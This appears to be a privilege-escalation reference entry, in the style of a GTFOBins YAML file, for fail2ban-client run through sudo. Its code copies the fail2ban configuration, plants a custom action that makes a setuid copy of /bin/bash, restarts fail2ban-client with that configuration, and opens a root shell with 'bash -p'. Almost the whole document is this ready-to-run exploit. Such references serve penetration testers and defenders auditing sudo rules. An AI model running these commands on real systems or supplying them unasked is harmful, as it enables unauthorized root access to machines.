---
functions:
  sudo:
    - description: |
        Loading tempered configuration file including code.
        Requires restarting the service.
        Since we, most likely, can't write into /etc/fail2ban/, we can copy the configuration folder to a temporary location and load this copy.
      code: |
        TD_conf=$(mktemp -d)
        rsync -av /etc/fail2ban/ $TD_conf
        TD_exploit=$(mktemp -d)
        cat > $TD_exploit/exploit <<EOF
        #!/bin/sh
        cp /bin/bash $TD_exploit/bash
        chmod 755 $TD_exploit/bash
        chmod u+s $TD_exploit/bash
        EOF
        chmod +x $TD_exploit/exploit
        cat > $TD_conf/action.d/custom-start-command.conf <<EOF
        [Definition]
        actionstart = $TD_exploit/exploit
        EOF
        cat >> $TD_conf/jail.local <<EOF
        [my-custom-jail]
        enabled = true
        action = custom-start-command
        EOF
        cat > $TD_conf/filter.d/my-custom-jail.conf <<EOF
        [Definition]
        EOF
        sudo /usr/bin/fail2ban-client -c $TD_conf -v restart
        $TD_exploit/bash -p
---
